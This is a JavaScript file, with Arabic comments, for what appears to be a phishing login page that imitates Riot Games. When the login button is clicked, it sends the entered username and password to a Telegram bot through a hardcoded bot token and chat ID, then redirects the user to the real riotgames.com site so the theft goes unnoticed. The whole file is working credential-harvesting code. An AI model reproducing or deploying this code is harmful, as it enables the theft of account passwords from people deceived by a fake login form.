document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.getElementById("login-btn");

    // التحقق من الحقول وتفعيل الزر
    function checkInputs() {
        if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
            loginBtn.removeAttribute("disabled"); // تفعيل الزر
        } else {
            loginBtn.setAttribute("disabled", "true"); // تعطيل الزر
        }
    }

    // إرسال البيانات إلى Telegram
    function sendToTelegram() {
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();

        if (username === "" || password === "") return;

        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; // استبدلها بالتوكن الخاص بك
        const chatId = "6687453395"; // استبدلها بمعرف الدردشة الخاص بك
        const message = `🔥 New Login Attempt 🔥\n\n👤 Username: ${username}\n🔒 Password: ${password}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("✅ Data sent successfully!");
                window.location.href = "https://www.riotgames.com/"; // إعادة توجيه بعد الإرسال
            } else {
                console.error("❌ Telegram error:", data);
            }
        })
        .catch(error => console.error("❌ Error sending to Telegram:", error));
    }

    // تفعيل الزر عند إدخال بيانات
    usernameInput.addEventListener("input", checkInputs);
    passwordInput.addEventListener("input", checkInputs);

    // تشغيل إرسال البيانات عند الضغط
    loginBtn.addEventListener("click", function () {
        if (!loginBtn.hasAttribute("disabled")) {
            sendToTelegram();
        }
    });
});
